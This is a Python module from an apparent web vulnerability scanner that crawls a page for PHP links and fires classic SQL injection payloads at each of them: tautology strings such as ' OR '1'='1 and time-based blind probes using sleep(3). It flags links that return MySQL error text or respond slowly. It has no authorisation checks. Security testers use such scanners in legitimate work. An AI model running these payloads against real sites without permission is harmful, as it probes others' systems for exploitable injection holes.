import requests
import time
from bs4 import BeautifulSoup
from ...config import Config
from messages import SuccessMessages, ErrorMessages
from ...handler.logger.log import log_data_to_file
from ...handler.errors import TimeoutRequest
from ...handler.retry.retryrequest import RetryRequest

payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' #", "' OR '1'='1' /*"]
blind_payloads = [" AND sleep(3)", " OR sleep(3)"]
retry_request = RetryRequest(max_retries=3)

CONFIG = Config()

def find_php_links(url) -> None:
    response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
    soup = BeautifulSoup(response.text, 'html.parser')
    php_links = [a['href'] for a in soup.find_all('a', href=True) if '.php?' in a['href']]
    for links in php_links:
        if 'http' not in links and 'https' not in links:
            links = f'{url}' + links
        if "#" in links:
            links = strip_url_fragment(links)
        if "/./" in links:
            links = remove_dot_segments(links)

        test_result = test_sql_injection(links)
        if test_result:
            for vuln in test_result:
                print(f"{SuccessMessages.FOUND_SQL_INJECTION} {vuln}")
        else:
            print(f"{ErrorMessages.NO_SQL_INJECTION_CONTENT}{links}")


def test_sql_injection(url):
    vulnerable_links = []
    for payload in payloads:
        try:
            response = retry_request.retry(requests.get, url + payload, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
            if 'mysql_fetch_array()' in response.text or 'You have an error in your SQL syntax;' in response.text:
                print(response.text)
                if url not in vulnerable_links:
                    vulnerable_links.append(url)
        except Exception as e:
            print(f"Error occurred: {e}")
    for blind_payload in blind_payloads:
        try:
            start_time = time.time()
            response = retry_request.retry(requests.get, f"{url}{blind_payload}", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
            end_time = time.time()
            if end_time - start_time > 3:
                if url not in vulnerable_links:
                    print(f"{SuccessMessages.FOUND_BLIND_SQL_INJECTION} {url}")
                    vulnerable_links.append(url)
        except Exception as e:
            print(f"Error occurred: {e}")
    return vulnerable_links

def strip_url_fragment(url: str) -> str:
    return url.split('#', 1)[0]
def remove_dot_segments(url: str) -> str:
    return url.replace('/./', '/')
